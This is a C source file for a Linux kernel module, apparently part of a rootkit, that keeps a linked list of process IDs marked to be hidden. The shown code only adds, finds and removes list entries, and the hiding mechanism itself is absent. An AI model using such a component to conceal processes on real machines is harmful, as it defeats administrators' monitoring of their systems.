#include <linux/slab.h>
#include <linux/pid.h>

#include "hidepid.h"

pid_list_t hidden_pids = {
    .pid  = -1,
    .prev = NULL,
    .next = NULL,
};

pid_list_t_ptr hidden_pids_tail = &hidden_pids;


void
hide_pid(pid_t pid)
{
    if (list_contains_pid(&hidden_pids, pid))
        return;

    add_pid_to_list(hidden_pids_tail, pid);
}

void
unhide_pid(pid_t pid)
{
    pid_list_t_ptr node;
    if (!(node = find_pid_in_list(&hidden_pids, pid)))
        return;

    if (node == &hidden_pids)
        return;

    remove_pid_from_list(node, pid);
}

void
clear_hidden_pids(void)
{
    pid_list_t_ptr i = hidden_pids_tail;
    while ((i = remove_pid_from_list(i, i->pid)));
}

void
unhide_pids(void)
{
    clear_hidden_pids();
    // TODO: disable pid hiding
}


bool
list_contains_pid(pid_list_t_ptr list, pid_t pid)
{
    return !!find_pid_in_list(list, pid);
}

pid_list_t_ptr
find_pid_in_list(pid_list_t_ptr head, pid_t pid)
{
    pid_list_t_ptr i;
    for (i = head; i; i = i->next)
        if (i->pid == pid)
            return i;

    return NULL;
}

pid_list_t_ptr
add_pid_to_list(pid_list_t_ptr tail, pid_t pid)
{
    pid_list_t_ptr node;
    node = (pid_list_t_ptr)kmalloc(sizeof(pid_list_t), GFP_KERNEL);

    if (node) {
        node->pid = pid;
        node->next = NULL;
        node->prev = tail;
        tail->next = node;
        hidden_pids_tail = node;
        return node;
    }

    return NULL;
}

pid_list_t_ptr
remove_pid_from_list(pid_list_t_ptr list, pid_t pid)
{
    pid_list_t_ptr i = find_pid_in_list(list, pid), ret = NULL;

    if (i && (i->pid != -1)) {
        if (i->next)
            i->next->prev = i->prev;
        else
            hidden_pids_tail = i->prev ? i->prev : &hidden_pids;

        if (i->prev) {
            i->prev->next = i->next;
            ret = i->prev;
        }

        kfree(i);
    }

    return ret;
}
